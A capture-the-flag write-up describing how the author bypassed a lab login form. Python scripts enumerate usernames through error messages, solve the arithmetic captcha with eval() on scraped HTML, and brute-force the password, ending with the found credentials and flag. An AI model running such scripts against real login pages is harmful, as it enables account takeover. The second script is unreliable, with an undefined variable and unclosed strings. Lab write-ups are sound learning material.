>This flag was about bypassing a login form
---

I get the files `usernames.txt` and `passwords.txt`
* Strong hints towards brute forcing

```bash
cat passwords.txt | wc -l
> 1567

cat usernames.txt | wc -l
> 877
```
* 1567 passwords
* 877 usernames

![testtest](<./assets/20260706114949.png)

I am met with this page at `http://10.81.156.10/login` 

When trying different usernames and passwords I eventually get this:
![[Pasted image 20260706115014.png]]

Which means that I have to supply the captcha in the data.

I notice that when I supply a username that does not exist, I get this:
![[Pasted image 20260706115244.png]]
* This means that I can find the username and password separately.

```python
import requests

def solveCaptcha(res_text):
	q = res_text.split("</h3></b></label><br>")[1].split("<")[0].split("\n")[1].split(" ")
	return (eval(f"{q[4]}{q[5]}{q[6]}"))


def main():
	url = "http://10.81.156.10/login"

	with open("usernames.txt","r") as f:
		usernames = [u.strip() for u in f if u.strip()]
		
		for user in usernames:
			session = requests.Session()	
			
			data = {
				"username": f"{user}",
				"password": "test"
			}
			
			res = session.post(url=url, data=data)
			
			if "Too many bad login attempts!" in res.text:
				ans = solveCaptcha(res.text)
				
				data = {
					"username": f"{user}",
					"password": "test",
					"captcha": f"{ans}"
				}
				print(f"[+] Trying {user}")
				res = session.post(url=url,data=data)
				
				if "does not exist" not in res.text:
					print(f"### VALID USER FOUND === {user} ###")
					break
					
				if "Invalid captcha" in res.text:
					print("### INVALID CAPTCHA ###")
					print(res.text)
					break
		print("### NO VALID USERNAME WAS FOUND ###")
				
				
if __name__ == "__main__":
	main()
```



# The syntax

```python
session = requests.Session()
```
* Session was used to connect each capcha question to two posts.
* At first I did this:
```python
requests.get(...) # Get the captcha message
requests.post(...) # Send post with correct captcha
```
* Because the `get` and the `post` are in different sessions I solved the captcha received from  `get` but with the new post, there was a new captcha.

With `Session()` get and post will have the same captcha, even though I found another solution that did not require both get and post. But this was still used.


```python
def solveCaptcha(res_text):
	q = res_text.split("</h3></b></label><br>")[1].split("<")[0].split("\n")[1].split(" ")
	return (eval(f"{q[4]}{q[5]}{q[6]}"))
```

This was made by looking at the html that was sent back when a captcha had to be solved.
* `q[4]` was the first number, ex. "39"
* `q[5]` was the operator, ex. "+"
* `q[6]` was the second number, ex "22"
`eval` was used to calculate the value of the string.


```python
with open("usernames.txt","r") as f:
	usernames = [u.strip() for u in f if u.strip()]
```
This is pretty cool as well.
* Creates a list of usernames where each username is stripped, meaning spaces, newlines, etc.  before and after the name will be removed. Only call `strip()` if strip is possible.

![[Pasted image 20260706125223.png]]
USERNAME: natalie

# Now for the password
```python
import requests

def solveCaptcha(res_text):
	q = res_text.split("</h3></b></label><br>")[1].split("<")[0].split("\n")[1].split(" ")
	return (eval(f"{q[4]}{q[5]}{q[6]}"))


def main():
	host = "http://10.81.156.10/login"
	
	with open("passwords.txt","r") as f:
		passwords = [p.strip() for p in f if p.strip()]
		
		for pwd in passwords:
			
			data = {
				"username": "natalie",
				"password": f"{pwd}"
			}
			
			session = requests.Session()
			res = session.post(url=url,data=data)
			
			if "Too many bad login attempts!" in res.text:
				ans = solveCaptcha(res.text)
				data = {
					"username": "natalie",
					"password": f"{pwd}",
					"captcha": f"{ans}"
				}
				
				print(f"[+] Trying {pwd}")
				res = session.post(url=url,data=data)
				
				if "Invalid password" not in res.text:
					print(f"### VALID PASSWORD FOUND === {pwd} ###)
					break
					
				if "Invalid captcha" in res.text:
					print("### INVALID CAPTCHA ###)
					print(res.text)
					break
		
		print("### NO VALID PASSWORD WAS FOUND ###")


if __name__ == "__main__":
	main()
```
![[Pasted image 20260706130343.png]]

# Creds
natalie:sk8board

![[Pasted image 20260706120136.png]]
```html
<h2>Flag.txt:</h2>
<h3>7df2eabce36f02ca8ed7f237f77ea416</h3>
```

